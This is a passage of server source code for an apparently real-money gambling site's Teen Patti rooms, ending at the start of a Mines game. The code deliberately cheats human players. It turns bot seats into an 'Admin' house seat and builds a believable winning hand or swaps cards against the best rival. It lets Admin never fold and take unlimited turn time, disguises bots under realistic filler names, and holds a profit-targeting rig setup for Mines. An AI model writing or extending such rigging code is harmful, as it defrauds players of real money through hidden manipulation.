    const targetedSeated = targeted.length === 0 || activeOccupied.some(s => s.username && !s.is_bot && targeted.some(u => u.toLowerCase() === s.username.toLowerCase()));
    if (botDecision.shouldRig && targetedSeated) {
      // Find a bot seat to win the pot for the house (admin, when seated, is already handled above)
      const botSeat = activeOccupied.find(s => s.is_bot);
      const targetSeat = botSeat || activeOccupied[0];
      if (targetSeat) {
        rigSeat = targetSeat.seat;
        rigReason = `AI BOT TAKEOVER (${botDecision.profit_pct}% TARGET)`;
        // Whenever the algorithm's own pick is a genuine filler/NPC seat (never a real connected
        // human it fell back to), rename it to "Admin" for this hand — the house's seat, winning by
        // a slight better margin via the same oblivious-hand construction as every other rig path.
        if (botSeat) {
          targetSeat.username = 'Admin';
          try {
            await prisma.teenPattiSeat.update({
              where: { id: botSeat.id },
              data: { username: 'Admin', is_bot: false }
            });
          } catch (e) { console.error('[TP] Error renaming targeted seat to Admin:', e.message); }
        }
        // Persist the rig for this hand so showdown resolution (which reads room.admin_rig) and the
        // was_rigged disclosure flag both pick it up consistently, same as the manual-rig path.
        try {
          await prisma.teenPattiRoom.update({
            where: { id: roomId },
            data: { admin_rig: { winner_seat: rigSeat, is_bot_rig: true, profit_pct: botDecision.profit_pct } }
          });
        } catch (e) { console.error('[TP] Error persisting bot rig for round start:', e.message); }
      }
    }
  }

  // Apply Rigging: Oblivious Rigging (construct closest believable winning hand)
  if (rigSeat !== undefined) {
    const freshSeats = await prisma.teenPattiSeat.findMany({
      where: { room_id: roomId },
      orderBy: { seat: 'asc' }
    });
    const activeSeats = freshSeats.filter(s => s.username && s.cards);
    if (activeSeats.length >= 2) {
      const rivalSeats = activeSeats.filter(s => s.seat !== rigSeat);
      if (rivalSeats.length > 0) {
        let bestRivalSeat = rivalSeats[0];
        for (let i = 1; i < rivalSeats.length; i++) {
          if (tpHandWins(tpEvaluateHand(rivalSeats[i].cards), tpEvaluateHand(bestRivalSeat.cards))) {
            bestRivalSeat = rivalSeats[i];
          }
        }
        const rivalBestHand = tpEvaluateHand(bestRivalSeat.cards);
        const rigTarget = activeSeats.find(s => s.seat === rigSeat);

        if (rigTarget) {
          // Collect all cards used by rival seats
          const usedCardKeys = new Set();
          rivalSeats.forEach(s => {
            if (s.cards) s.cards.forEach(c => usedCardKeys.add(`${c.r}_${c.suit || c.s}`));
          });

          const fullDeck = tpCreateDeck();
          const remainingDeck = fullDeck.filter(c => !usedCardKeys.has(`${c.r}_${c.s}`));
          const oblivious = tpFindObliviousWinningHand(remainingDeck, rivalBestHand);

          if (oblivious && oblivious.cards) {
            const formattedRigCards = tpFormatCards(oblivious.cards);
            await prisma.teenPattiSeat.update({
              where: { id: rigTarget.id },
              data: { cards: formattedRigCards }
            });
            console.log(`[TP] ${rigReason}: Room ${roomId} — Seat ${rigSeat} assigned believable winning hand (${tpHandLabel(oblivious.evaluation[0])}) vs rival (${tpHandLabel(rivalBestHand[0])})`);
          } else {
            // Fallback swap
            const tempCards = rigTarget.cards;
            await prisma.teenPattiSeat.update({ where: { id: rigTarget.id }, data: { cards: bestRivalSeat.cards } });
            await prisma.teenPattiSeat.update({ where: { id: bestRivalSeat.id }, data: { cards: tempCards } });
            console.log(`[TP] ${rigReason} (Fallback): Room ${roomId} — swapped seat ${rigSeat} with best rival seat ${bestRivalSeat.seat}`);
          }
        }
      }
    }
  }

  const firstSeat = occupiedSeats.sort((a, b) => a.seat - b.seat)[0].seat;

  await prisma.teenPattiRoom.update({
    where: { id: roomId },
    data: {
      status: 'playing',
      pot: pot,
      current_stake: bootAmt,
      turn_seat: firstSeat,
      turn_index: 0,
      turn_start: new Date(),
      winner_seat: null,
      round: room.round + 1,
      deck_state: deck.slice(0, 10), // keep some deck state
      log: [`Round #${room.round + 1} started! Boot: ₹${bootAmt}. Pot: ₹${pot}`]
    }
  });

  console.log(`[TP] Round #${room.round + 1} started in ${roomId} with ${occupiedSeats.length} players. Pot: ₹${pot}`);

  // If first seat is a bot, schedule bot action
  const firstPlayer = occupiedSeats.find(s => s.seat === firstSeat);
  if (firstPlayer && (firstPlayer.is_bot || firstPlayer.username.toLowerCase() === 'admin')) {
    scheduleBotTurn(roomId);
  }
}

// -- Process a player action --
async function tpProcessAction(roomId, username, action) {
  const room = await prisma.teenPattiRoom.findUnique({
    where: { id: roomId },
    include: { seats: { orderBy: { seat: 'asc' } } }
  });
  if (!room || room.status !== 'playing') return { error: 'Game not active.' };

  const mySeat = room.seats.find(s => s.username && s.username.toLowerCase() === username.toLowerCase());
  if (!mySeat) return { error: 'You are not in this room.' };
  if (mySeat.folded) return { error: 'You already folded.' };
  if (room.turn_seat !== mySeat.seat) return { error: 'Not your turn.' };

  const activeSeats = room.seats.filter(s => s.username && !s.folded);
  const log = Array.isArray(room.log) ? [...room.log] : [];

  if (action === 'chaal') {
    // Deduct stake from real player wallet
    if (!mySeat.is_bot) {
      const user = await prisma.user.findFirst({
        where: { username: { equals: username, mode: 'insensitive' } }
      });
      if (!user || user.wallet_balance < room.current_stake) {
        return { error: 'Insufficient balance for Chaal.' };
      }
      await prisma.user.update({
        where: { id: user.id },
        data: { wallet_balance: { decrement: room.current_stake } }
      });
      await prisma.transaction.create({
        data: {
          id: 'TP_' + Date.now() + '_chaal',
          user: username,
          type: 'Withdrawal',
          amount: room.current_stake,
          details: `Teen Patti Chaal — ${room.name}`,
          status: 'Completed'
        }
      });
    }

    const newPot = room.pot + room.current_stake;
    log.push(`${mySeat.username} played Chaal (₹${room.current_stake})`);

    const nextSeat = tpNextActiveSeat(activeSeats, mySeat.seat);

    await prisma.teenPattiRoom.update({
      where: { id: roomId },
      data: {
        pot: newPot,
        turn_seat: nextSeat,
        turn_start: new Date(),
        log: log.slice(-15)
      }
    });

    // Check if next player is a bot
    const nextPlayer = room.seats.find(s => s.seat === nextSeat);
    if (nextPlayer && (nextPlayer.is_bot || nextPlayer.username.toLowerCase() === 'admin') && !nextPlayer.folded) {
      scheduleBotTurn(roomId);
    }

    return { success: true };

  } else if (action === 'fold') {
    await prisma.teenPattiSeat.update({
      where: { id: mySeat.id },
      data: { folded: true }
    });
    log.push(`${mySeat.username} packed.`);

    // Check if only 1 player left
    const remainingActive = activeSeats.filter(s => s.seat !== mySeat.seat);
    if (remainingActive.length === 1) {
      return await tpEndGame(roomId, remainingActive[0], room.pot + 0, log, false);
    }

    const nextSeat = tpNextActiveSeat(
      room.seats.map(s => s.seat === mySeat.seat ? { ...s, folded: true } : s).filter(s => s.username && !s.folded),
      mySeat.seat
    );

    // Recalculate next from remaining active
    const stillActive = activeSeats.filter(s => s.seat !== mySeat.seat);
    const seatNums = stillActive.map(s => s.seat).sort((a, b) => a - b);
    const curIdx = seatNums.indexOf(mySeat.seat);
    let nextActiveSeat;
    if (curIdx === -1) {
      // mySeat folded, find next after mySeat.seat
      nextActiveSeat = seatNums.find(s => s > mySeat.seat) || seatNums[0];
    } else {
      nextActiveSeat = seatNums[(curIdx + 1) % seatNums.length];
    }

    await prisma.teenPattiRoom.update({
      where: { id: roomId },
      data: {
        turn_seat: nextActiveSeat,
        turn_start: new Date(),
        log: log.slice(-15)
      }
    });

    const nextPlayerAfterFold = room.seats.find(s => s.seat === nextActiveSeat);
    if (nextPlayerAfterFold && (nextPlayerAfterFold.is_bot || nextPlayerAfterFold.username.toLowerCase() === 'admin') && !nextPlayerAfterFold.folded) {
      scheduleBotTurn(roomId);
    }

    return { success: true };

  } else if (action === 'show') {
    if (activeSeats.length !== 2) return { error: 'Show only when 2 players remain.' };

    // Deduct show cost from real player
    if (!mySeat.is_bot) {
      const user = await prisma.user.findFirst({
        where: { username: { equals: username, mode: 'insensitive' } }
      });
      if (!user || user.wallet_balance < room.current_stake) {
        return { error: 'Insufficient balance for Show.' };
      }
      await prisma.user.update({
        where: { id: user.id },
        data: { wallet_balance: { decrement: room.current_stake } }
      });
    }

    const newPot = room.pot + room.current_stake;
    const opponent = activeSeats.find(s => s.seat !== mySeat.seat);

    // Check admin rig for show
    let winner;
    if (room.admin_rig && room.admin_rig.winner_seat !== undefined) {
      winner = activeSeats.find(s => s.seat === room.admin_rig.winner_seat) || null;
    }
    if (!winner) {
      const myHand = tpEvaluateHand(mySeat.cards);
      const oppHand = tpEvaluateHand(opponent.cards);
      winner = tpHandWins(myHand, oppHand) ? mySeat : opponent;
    }

    log.push(`${mySeat.username} called Show!`);
    return await tpEndGame(roomId, winner, newPot, log, true);

  } else {
    return { error: 'Unknown action.' };
  }
}

// -- End game and credit winner --
async function tpEndGame(roomId, winnerSeat, pot, log, wasShow) {
  const winnerName = winnerSeat.username;
  if (wasShow) {
    log.push(`${winnerName} won the Show! Pot: ₹${pot}`);
  } else {
    log.push(`Everyone folded. ${winnerName} wins! Pot: ₹${pot}`);
  }

  // Credit winner wallet if real player
  if (!winnerSeat.is_bot && winnerName) {
    try {
      await prisma.user.updateMany({
        where: { username: { equals: winnerName, mode: 'insensitive' } },
        data: { wallet_balance: { increment: pot } }
      });
      await prisma.transaction.create({
        data: {
          id: 'TP_WIN_' + Date.now(),
          user: winnerName,
          type: 'Deposit',
          amount: pot,
          details: `Teen Patti Won Pot`,
          status: 'Completed'
        }
      });
    } catch (e) { console.error('[TP] Winner credit error:', e.message); }
  }

  log.push(`🏆 GAME OVER — ${winnerName} WON THE POT OF ₹${pot}!`);

  await prisma.teenPattiRoom.update({
    where: { id: roomId },
    data: {
      status: 'finished',
      winner_seat: winnerSeat.seat,
      pot: pot,
      log: log.slice(-15)
    }
  });

  console.log(`[TP] Game ended in ${roomId}. Winner: ${winnerName} (seat ${winnerSeat.seat}). Pot: ₹${pot}`);

  // Show winner for 5 seconds, then empty room back to 0/4
  setTimeout(async () => {
    try {
      // Clear all seat occupants so room becomes 0/4 empty again
      await prisma.teenPattiSeat.updateMany({
        where: { room_id: roomId },
        data: { username: null, is_bot: false, cards: null, folded: false }
      });

      // Reset room state to waiting (keep winner_seat so lobby can briefly show last winner)
      await prisma.teenPattiRoom.update({
        where: { id: roomId },
        data: { status: 'waiting', pot: 0, winner_seat: null }
      });

      const botDecision = shouldBotRigThisRound('teenpatti');
      if (botDecision.shouldRig) {
        // Pre-seed a seat so the table looks populated/ready to play — this is a cosmetic room-filling
        // heuristic only. Routed through nextRoomFillerUsername() so that if this room also happens to
        // have a random admin-entry reservation due at this exact position, it's honored here instead
        // of being overwritten by a plain filler; otherwise a normal realistic name is used. Whether
        // the NEXT hand actually gets rigged beyond that is decided fresh in tpStartRound once real
        // players are seated, based on live per-user bot targeting.
        const randomSeat = Math.floor(Math.random() * 4);
        const filler = nextRoomFillerUsername(roomId, 0);
        await prisma.teenPattiSeat.updateMany({
          where: { room_id: roomId, seat: randomSeat },
          data: { username: filler.username, is_bot: filler.is_bot, folded: false }
        });
      }
      // Always clear any leftover per-hand rig now that this hand is fully over — tpStartRound sets a
      // fresh one (or not) for the next hand based on who's actually seated at that point.
      await prisma.teenPattiRoom.update({
        where: { id: roomId },
        data: { admin_rig: null }
      });

      console.log(`[TP] Winner display ended in ${roomId} — room emptied back to 0/4.`);
    } catch (e) { console.error('[TP] Room empty error:', e.message); }
  }, 5000);

  return { success: true, winner: winnerName };
}

// -- Bot & Admin turn scheduler --
function scheduleBotTurn(roomId) {
  const delay = TP_BOT_THINK_MIN + Math.floor(Math.random() * (TP_BOT_THINK_MAX - TP_BOT_THINK_MIN));
  setTimeout(async () => {
    try {
      const room = await prisma.teenPattiRoom.findUnique({
        where: { id: roomId },
        include: { seats: { orderBy: { seat: 'asc' } } }
      });
      if (!room || room.status !== 'playing') return;

      const botSeat = room.seats.find(s => s.seat === room.turn_seat && (s.is_bot || s.username.toLowerCase() === 'admin') && !s.folded);
      if (!botSeat) return;

      const activeSeats = room.seats.filter(s => s.username && !s.folded);

      // Bot can show if only 2 left and has a strong hand (or if it is Admin, we show to win)
      if (activeSeats.length === 2) {
        const hand = tpEvaluateHand(botSeat.cards);
        if (hand[0] >= 4 || botSeat.username.toLowerCase() === 'admin') {
          await tpProcessAction(roomId, botSeat.username, 'show');
          return;
        }
      }

      let decision = tpBotDecide(botSeat.cards, room.current_stake);
      if (botSeat.username.toLowerCase() === 'admin' && decision === 'fold') {
        decision = 'chaal'; // Admin never folds
      }
      await tpProcessAction(roomId, botSeat.username, decision);
    } catch (e) { console.error('[TP] Bot turn error:', e.message); }
  }, delay);
}

// -- Turn timeout checker & Player presence tracker (runs every 5s) --
setInterval(async () => {
  try {
    const playingRooms = await prisma.teenPattiRoom.findMany({
      where: { status: 'playing' },
      include: { seats: { orderBy: { seat: 'asc' } } }
    });

    for (const room of playingRooms) {
      // Disband stuck playing rooms with fewer than 2 active players
      const activeRemaining = room.seats.filter(s => s.username && !s.folded);
      if (activeRemaining.length < 2) {
        console.log(`[TP Monitor] Stuck playing room ${room.id} with ${activeRemaining.length} active players. Force-disbanding.`);
        await prisma.teenPattiSeat.updateMany({
          where: { room_id: room.id },
          data: { username: null, is_bot: false, cards: null, folded: false }
        });
        await prisma.teenPattiRoom.update({
          where: { id: room.id },
          data: { status: 'waiting', pot: 0, winner_seat: null }
        });
        continue;
      }

      if (!room.turn_start) continue;
      const elapsed = (Date.now() - new Date(room.turn_start).getTime()) / 1000;
      if (elapsed >= TP_TURN_TIMEOUT) {
        const currentSeat = room.seats.find(s => s.seat === room.turn_seat);
        if (currentSeat && currentSeat.username && !currentSeat.folded) {
          if (currentSeat.username.toLowerCase() === 'admin') {
            // Admin NEVER auto-folds on timeout! Reset turn timer to give admin infinite time to win.
            await prisma.teenPattiRoom.update({
              where: { id: room.id },
              data: { turn_start: new Date() }
            });
            console.log(`[TP] Admin turn timeout extended in ${room.id}`);
          } else if (currentSeat.is_bot) {
            // Bots make their strategic move (Chaal or Show) instead of folding on timeout
            let decision = tpBotDecide(currentSeat.cards, room.current_stake);
            await tpProcessAction(room.id, currentSeat.username, decision);
          } else {
            console.log(`[TP] Timeout auto-fold: ${currentSeat.username} in ${room.id}`);
            await tpProcessAction(room.id, currentSeat.username, 'fold');
          }
        }
      }
    }

    // Force-clear finished rooms that are stuck for too long (> 10s)
    const finishedRooms = await prisma.teenPattiRoom.findMany({
      where: { status: 'finished' }
    });
    for (const room of finishedRooms) {
      const elapsed = (Date.now() - new Date(room.updated_at).getTime()) / 1000;
      if (elapsed >= 10) {
        await prisma.teenPattiSeat.updateMany({
          where: { room_id: room.id },
          data: { username: null, is_bot: false, cards: null, folded: false }
        });
        await prisma.teenPattiRoom.update({
          where: { id: room.id },
          data: { status: 'waiting', pot: 0, winner_seat: null }
        });
        console.log(`[TP Monitor] Force-reset stuck finished room ${room.id} back to waiting.`);
      }
    }

    // Presence Check: Auto-remove players who stopped polling (e.g. closed tab)
    const now = Date.now();
    const realPlayerSeats = await prisma.teenPattiSeat.findMany({
      where: {
        username: { not: null },
        is_bot: false
      }
    });

    for (const seat of realPlayerSeats) {
      if (seat.username && seat.username.toLowerCase() === 'admin') continue;
      const key = `${seat.room_id}:${seat.seat}`;
      const lastActive = TP_SEAT_HEARTBEATS[key];

      // If they haven't polled in > 10 seconds, remove them
      if (!lastActive || (now - lastActive) > 10000) {
        console.log(`[TP Monitor] Auto-removing inactive player "${seat.username}" from ${seat.room_id} seat ${seat.seat}`);

        // If game is active and they haven't folded, auto-fold first
        const room = await prisma.teenPattiRoom.findUnique({ where: { id: seat.room_id } });
        if (room && room.status === 'playing' && !seat.folded) {
          try {
            await tpProcessAction(seat.room_id, seat.username, 'fold');
          } catch (e) { /* ignore */ }
        }

        // Clear the seat
        await prisma.teenPattiSeat.update({
          where: { id: seat.id },
          data: { username: null, is_bot: false, cards: null, folded: false }
        });

        // Delete heartbeat tracker entry
        delete TP_SEAT_HEARTBEATS[key];

        // Check if room should go back to waiting (no real players left)
        const checkRoom = await prisma.teenPattiRoom.findUnique({
          where: { id: seat.room_id },
          include: { seats: true }
        });
        if (checkRoom) {
          const realPlayersRemaining = checkRoom.seats.filter(s => s.username && !s.is_bot);
          if (realPlayersRemaining.length === 0) {
            // Remove all bots too
            await prisma.teenPattiSeat.updateMany({
              where: { room_id: seat.room_id },
              data: { username: null, is_bot: false, cards: null, folded: false }
            });
            await prisma.teenPattiRoom.update({
              where: { id: seat.room_id },
              data: { status: 'waiting', pot: 0, winner_seat: null }
            });
            console.log(`[TP Monitor] Cleared empty room ${seat.room_id}`);
          }
        }
      }
    }
  } catch (e) { /* silent */ }
}, 5000);

// -- Bot fill checker: fill empty seats with bots when real players are waiting --
const roomJoinTimers = {};

function scheduleBotFill(roomId) {
  if (roomJoinTimers[roomId]) return; // already scheduled
  roomJoinTimers[roomId] = setTimeout(async () => {
    delete roomJoinTimers[roomId];
    try {
      const room = await prisma.teenPattiRoom.findUnique({
        where: { id: roomId },
        include: { seats: { orderBy: { seat: 'asc' } } }
      });
      if (!room || room.status !== 'waiting') return;

      const seatedPlayers = room.seats.filter(s => s.username);
      if (seatedPlayers.length === 0) return; // nobody waiting

      // Fill ALL empty seats to reach 4/4 — routed through nextRoomFillerUsername() so a pending
      // random admin-entry reservation (if this room has one due) is honored at its reserved position
      // within this very fill batch, rather than always landing on the last seat filled.
      const emptySeats = room.seats.filter(s => !s.username);
      let botIdx = 0;
      for (const seat of emptySeats) {
        if (botIdx >= 4) break;
        const filler = nextRoomFillerUsername(roomId, seatedPlayers.length + botIdx);
        await prisma.teenPattiSeat.update({
          where: { id: seat.id },
          data: {
            username: filler.username,
            is_bot: filler.is_bot,
            folded: false
          }
        });
        botIdx++;
      }

      console.log(`[TP] Filled ${botIdx} bot(s) in ${roomId}. Starting round...`);
      await tpStartRound(roomId);
    } catch (e) { console.error('[TP] Bot fill error:', e.message); }
  }, TP_BOT_FILL_DELAY);
}

// ===================== TEEN PATTI API ENDPOINTS =====================

// GET /api/teenpatti/rooms — List all rooms
app.get('/api/teenpatti/rooms', async (req, res) => {
  try {
    const rooms = await prisma.teenPattiRoom.findMany({
      orderBy: { id: 'asc' },
      include: { seats: { orderBy: { seat: 'asc' } } }
    });
    const result = rooms.map(r => {
      const winnerSeatObj = r.winner_seat !== null ? r.seats.find(s => s.seat === r.winner_seat) : null;
      const winnerName = winnerSeatObj ? winnerSeatObj.username : null;
      return {
        id: r.id,
        name: r.name,
        boot_amount: r.boot_amount,
        status: r.status,
        pot: r.pot,
        round: r.round,
        winner_seat: r.winner_seat,
        winner_name: winnerName,
        players: r.seats.filter(s => s.username).map(s => ({
          seat: s.seat,
          username: s.username,
          is_bot: s.is_bot,
          folded: s.folded
        })),
        player_count: r.seats.filter(s => s.username).length,
        real_player_count: r.seats.filter(s => s.username && !s.is_bot).length,
        admin_rig: r.admin_rig
      };
    });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/teenpatti/join — Join a room
app.post('/api/teenpatti/join', async (req, res) => {
  const { room_id, username } = req.body;
  if (!room_id || !username) return res.status(400).json({ error: 'room_id and username required.' });

  try {
    const user = await getOrCreateUser(username);
    if (!user) return res.status(400).json({ error: 'User not found.' });

    const room = await prisma.teenPattiRoom.findUnique({
      where: { id: room_id },
      include: { seats: { orderBy: { seat: 'asc' } } }
    });
    if (!room) return res.status(404).json({ error: 'Room not found.' });

    // Check if user already in this room
    const existingSeat = room.seats.find(s => s.username && s.username.toLowerCase() === username.toLowerCase());
    if (existingSeat) return res.json({ success: true, seat: existingSeat.seat, message: 'Already in room.' });

    // Check if user is in another room — leave it first
    const otherSeat = await prisma.teenPattiSeat.findFirst({
      where: {
        username: { equals: username, mode: 'insensitive' },
        is_bot: false
      }
    });
    if (otherSeat && otherSeat.room_id !== room_id) {
      await prisma.teenPattiSeat.update({
        where: { id: otherSeat.id },
        data: { username: null, is_bot: false, cards: null, folded: false }
      });
      delete TP_SEAT_HEARTBEATS[`${otherSeat.room_id}:${otherSeat.seat}`];

      const oldRoomId = otherSeat.room_id;
      const oldRoom = await prisma.teenPattiRoom.findUnique({
        where: { id: oldRoomId },
        include: { seats: true }
      });
      if (oldRoom) {
        const oldRoomRealPlayers = oldRoom.seats.filter(s => s.username && !s.is_bot && s.username.toLowerCase() !== username.toLowerCase());
        if (oldRoomRealPlayers.length === 0) {
          await prisma.teenPattiSeat.updateMany({
            where: { room_id: oldRoomId },
            data: { username: null, is_bot: false, cards: null, folded: false }
          });
          await prisma.teenPattiRoom.update({
            where: { id: oldRoomId },
            data: { status: 'waiting', pot: 0, winner_seat: null }
          });
          console.log(`[TP] Cleared old room ${oldRoomId} since last real player left to join ${room_id}`);
        }
      }
    }

    // Check wallet balance
    if (user.wallet_balance < room.boot_amount) {
      return res.status(400).json({ error: `Need at least ₹${room.boot_amount} to join. Your balance: ₹${user.wallet_balance}` });
    }

    // Find empty seat or auto-evict a bot seat to make room for human player
    let targetSeat = room.seats.find(s => !s.username);
    if (!targetSeat) {
      targetSeat = room.seats.find(s => s.is_bot);
    }

    if (!targetSeat) {
      return res.status(400).json({ error: 'Room is full with 4 real players.' });
    }

    await prisma.teenPattiSeat.update({
      where: { id: targetSeat.id },
      data: {
        username: username,
        is_bot: false,
        folded: false,
        cards: null,
        balance: user.wallet_balance
      }
    });

    console.log(`[TP] ${username} joined ${room_id} at seat ${targetSeat.seat}`);

    // Check if we should fill bots and start
    const updatedRoom = await prisma.teenPattiRoom.findUnique({
      where: { id: room_id },
      include: { seats: true }
    });
    const occupiedCount = updatedRoom.seats.filter(s => s.username).length;

    if (occupiedCount >= 3 && updatedRoom.status === 'waiting') {
      // Fill remaining empty seats and start immediately — routed through nextRoomFillerUsername() so
      // a pending random admin-entry reservation (if due) is honored here instead of always landing
      // on the last seat filled.
      const emptySeats = updatedRoom.seats.filter(s => !s.username);
      let botIdx = 0;
      for (const seat of emptySeats) {
        if (botIdx >= 4) break;
        const filler = nextRoomFillerUsername(room_id, occupiedCount + botIdx);
        await prisma.teenPattiSeat.update({
          where: { id: seat.id },
          data: { username: filler.username, is_bot: filler.is_bot, folded: false }
        });
        botIdx++;
      }
      await tpStartRound(room_id);
    } else if (occupiedCount >= 1 && updatedRoom.status === 'waiting') {
      scheduleBotFill(room_id);
    }

    res.json({ success: true, seat: targetSeat.seat });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/teenpatti/leave — Leave a room
app.post('/api/teenpatti/leave', async (req, res) => {
  const { room_id, username } = req.body;
  if (!room_id || !username) return res.status(400).json({ error: 'room_id and username required.' });

  try {
    const seat = await prisma.teenPattiSeat.findFirst({
      where: {
        room_id: room_id,
        username: { equals: username, mode: 'insensitive' },
        is_bot: false
      }
    });
    if (!seat) return res.json({ success: true, message: 'Not in room.' });

    // If game is playing, auto-fold first
    const room = await prisma.teenPattiRoom.findUnique({ where: { id: room_id } });
    if (room && room.status === 'playing' && !seat.folded) {
      await tpProcessAction(room_id, username, 'fold');
    }

    await prisma.teenPattiSeat.update({
      where: { id: seat.id },
      data: { username: null, is_bot: false, cards: null, folded: false }
    });

    console.log(`[TP] ${username} left ${room_id}`);

    // Check if room should go back to waiting
    const updatedRoom = await prisma.teenPattiRoom.findUnique({
      where: { id: room_id },
      include: { seats: true }
    });
    const realPlayers = updatedRoom.seats.filter(s => s.username && !s.is_bot);
    if (realPlayers.length === 0) {
      // Remove all bots too
      await prisma.teenPattiSeat.updateMany({
        where: { room_id: room_id },
        data: { username: null, is_bot: false, cards: null, folded: false }
      });
      await prisma.teenPattiRoom.update({
        where: { id: room_id },
        data: { status: 'waiting', pot: 0, winner_seat: null }
      });
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/teenpatti/state — Get room state (cards hidden for opponents)
app.get('/api/teenpatti/state', async (req, res) => {
  const { room_id, username } = req.query;
  if (!room_id) return res.status(400).json({ error: 'room_id required.' });

  try {
    const room = await prisma.teenPattiRoom.findUnique({
      where: { id: room_id },
      include: { seats: { orderBy: { seat: 'asc' } } }
    });
    if (!room) return res.status(404).json({ error: 'Room not found.' });

    const isFinished = room.status === 'finished';
    const mySeat = username ? room.seats.find(s =>
      s.username && s.username.toLowerCase() === username.toLowerCase()
    ) : null;

    if (mySeat) {
      TP_SEAT_HEARTBEATS[`${room.id}:${mySeat.seat}`] = Date.now();
      if (!mySeat.is_bot) markUserActive('teenpatti', username);
    }

    // Calculate time left for current turn
    let timeLeft = TP_TURN_TIMEOUT;
    if (room.status === 'playing' && room.turn_start) {
      const elapsed = (Date.now() - new Date(room.turn_start).getTime()) / 1000;
      timeLeft = Math.max(0, TP_TURN_TIMEOUT - Math.floor(elapsed));
    }

    const seats = room.seats.map(s => {
      const isMe = mySeat && s.seat === mySeat.seat;
      const showCards = isMe || isFinished;
      return {
        seat: s.seat,
        username: s.username,
        is_bot: s.is_bot,
        folded: s.folded,
        cards: showCards ? tpFormatCards(s.cards) : (s.cards ? [null, null, null] : null),
        hand_label: showCards && s.cards ? tpHandLabel(tpEvaluateHand(s.cards)[0]) : null,
        is_me: isMe || false
      };
    });

    // Get user's current wallet balance
    let walletBalance = 0;
    if (username) {
      const user = await prisma.user.findFirst({
        where: { username: { equals: username, mode: 'insensitive' } }
      });
      walletBalance = user ? user.wallet_balance : 0;
    }

    res.json({
      room_id: room.id,
      name: room.name,
      boot_amount: room.boot_amount,
      status: room.status,
      pot: room.pot,
      current_stake: room.current_stake,
      turn_seat: room.turn_seat,
      time_left: timeLeft,
      round: room.round,
      winner_seat: room.winner_seat,
      winner_name: isFinished && room.winner_seat !== null
        ? (room.seats.find(s => s.seat === room.winner_seat) || {}).username
        : null,
      seats: seats,
      log: room.log || [],
      my_seat: mySeat ? mySeat.seat : null,
      wallet_balance: walletBalance,
      admin_rig: room.admin_rig,
      was_rigged: !!(isFinished && room.admin_rig && room.admin_rig.winner_seat !== undefined)
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/teenpatti/action — Play an action
app.post('/api/teenpatti/action', async (req, res) => {
  const { room_id, username, action } = req.body;
  if (!room_id || !username || !action) {
    return res.status(400).json({ error: 'room_id, username, and action required.' });
  }

  try {
    const result = await tpProcessAction(room_id, username, action);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/teenpatti/admin/rig — Rig a room & sit Admin on target seat (starts round immediately)
app.post('/api/teenpatti/admin/rig', async (req, res) => {
  const { room_id, winner_seat } = req.body;
  if (!room_id) return res.status(400).json({ error: 'room_id required.' });

  try {
    const seatIdx = parseInt(winner_seat);
    const validSeat = isNaN(seatIdx) ? 0 : seatIdx;

    const adminUser = await getOrCreateUser('Admin');
    if (adminUser) {
      await prisma.user.update({
        where: { id: adminUser.id },
        data: { wallet_balance: 5000.0 }
      });
    }

    // Remove "Admin" from any other seat in this room
    await prisma.teenPattiSeat.updateMany({
      where: { room_id: room_id, username: 'Admin' },
      data: { username: null, is_bot: false, cards: null, folded: false }
    });

    // Target seat occupant check: if empty or occupied by bot, sit "Admin" on target seat
    const targetSeat = await prisma.teenPattiSeat.findFirst({
      where: { room_id: room_id, seat: validSeat }
    });

    if (targetSeat && (!targetSeat.username || targetSeat.is_bot)) {
      await prisma.teenPattiSeat.update({
        where: { id: targetSeat.id },
        data: {
          username: 'Admin',
          is_bot: false,
          folded: false,
          cards: null,
          balance: 5000.0
        }
      });
    }

    // Set rig config and reset status to trigger fresh round
    await prisma.teenPattiRoom.update({
      where: { id: room_id },
      data: { status: 'waiting', admin_rig: { winner_seat: validSeat } }
    });

    console.log(`[TP] Admin rigged room ${room_id} — target seat ${validSeat}`);

    // Fill remaining seats with realistic filler players if needed & start round immediately
    const room = await prisma.teenPattiRoom.findUnique({
      where: { id: room_id },
      include: { seats: { orderBy: { seat: 'asc' } } }
    });

    if (room) {
      const emptySeats = room.seats.filter(s => !s.username);
      let botIdx = 0;
      for (const seat of emptySeats) {
        if (botIdx >= 4) break;
        await prisma.teenPattiSeat.update({
          where: { id: seat.id },
          data: { username: randomFillerName(), is_bot: true, folded: false }
        });
        botIdx++;
      }

      await tpStartRound(room_id);
      console.log(`[TP Admin Rig] Room ${room_id} round started immediately for seat ${validSeat}!`);
    }

    res.json({ success: true, room_id, winner_seat: validSeat });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===================== MINES / MINING GAME & ADMIN RIG ENGINE =====================

let MINES_RIG_CONFIG = {
  matrix: Array(25).fill('auto'), // 'auto', 'safe', 'mine'
  next_tile: null,                // null, 'gem', 'mine'
  rig_type: '',                   // '', 'guarantee_win', 'platform_profit'
  target_users: []                // array of targeted usernames for simultaneous traps
};

const MINES_USER_SESSIONS = {};

function calculateMinesMultiplier(gridSize, minesCount, revealedCount) {
  if (revealedCount <= 0) return 1.0;
  let prob = 1.0;
  for (let i = 0; i < revealedCount; i++) {
    const safeLeft = gridSize - minesCount - i;
    const totalLeft = gridSize - i;
    if (safeLeft <= 0) return 0.0;
    prob *= (safeLeft / totalLeft);
  }
  return parseFloat(((1.0 / prob) * 0.97).toFixed(2));
}

// GET /api/mines/state — Get user active Mines game state & server rig info
app.get('/api/mines/state', async (req, res) => {
  const username = req.query.username || 'DemoUser';
  try {
    const user = await getOrCreateUser(username);
    const session = MINES_USER_SESSIONS[username] || { status: 'idle' };
    const walletBalance = user ? user.wallet_balance : 1000.0;

    res.json({
      ok: true,
      state: {
        status: session.status || 'idle',
        grid_size: 25,
        mines_count: session.mines_count || 3,
        bet_amount: session.bet_amount || 0,
        revealed: session.revealed || [],
        multiplier: session.multiplier || 1.0,
        potential_payout: session.potential_payout || 0,
        seed_hash: session.seed_hash || null,
        server_seed: (session.status === 'busted' || session.status === 'cashed') ? session.server_seed : null,
        mine_positions: (session.status === 'busted' || session.status === 'cashed') ? session.mine_positions : null,
        balance: walletBalance,
